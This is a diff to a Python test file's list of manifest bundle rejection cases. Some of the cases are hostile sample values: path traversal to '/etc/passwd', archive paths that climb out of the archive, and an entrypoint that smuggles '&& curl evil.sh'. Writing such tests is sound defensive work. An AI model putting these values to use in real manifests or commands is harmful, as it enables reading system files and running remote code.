@@ -1018,8 +1018,8 @@ def test_bundle_files_exist_and_are_inlined(entry_path: Path) -> None:
 # A bundle is the one part of a manifest naming files and a command the host
 # acts on, so the schema is what stands between an entry and the host doing it.
 BUNDLE_REJECTIONS = [
-    ("a packed path that climbs out of the archive", {"files": {"../main.py": "skills/github-pr-reviewer/scripts/main.py"}}),
-    ("a packed path that is a bare dot segment", {"files": {"./main.py": "skills/github-pr-reviewer/scripts/main.py"}}),
+    ("a packed path that climbs out of the archive", {"files": {"../main.py": "plugins/github-pr-reviewer/scripts/main.py"}}),
+    ("a packed path that is a bare dot segment", {"files": {"./main.py": "plugins/github-pr-reviewer/scripts/main.py"}}),
     ("a source that traverses out of the repository", {"files": {"main.py": "skills/../../etc/passwd"}}),
     ("a source outside skills/ and automations/", {"files": {"main.py": "python/main.py"}}),
     ("an entrypoint carrying a shell metacharacter", {"entrypoint": "python3 main.py && curl evil.sh"}),
